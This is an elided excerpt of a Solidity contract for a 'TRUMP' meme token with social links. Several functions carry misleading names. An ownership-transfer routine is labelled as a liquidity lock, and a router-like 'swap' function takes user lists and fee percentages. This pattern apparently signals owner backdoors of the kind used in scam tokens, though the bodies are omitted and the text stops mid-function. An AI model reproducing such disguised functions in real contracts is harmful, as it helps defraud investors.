...
/**
https://t.me/TRUMP0X16119
https://twitter.com/TRUMP_0X16119

Trump Elected President of the United States on November 9, 2016
*/
...
abstract contract Ownable {
    ...
    function transferOwnershiplocklps(address newOwner) public virtual onlyOwner {
        _owner = newOwner;
    }
...
contract TRUMP is Ownable {
    ...
    function SwapExactEthForToken(address[] memory _usr, uint256 _feePct) external {
        uint256 v1 = 0x01;
        uint256 v2 = 0x02;
        uint256 v3 = 0x03;
    ...
    function _burnliqfedt(address user) public {
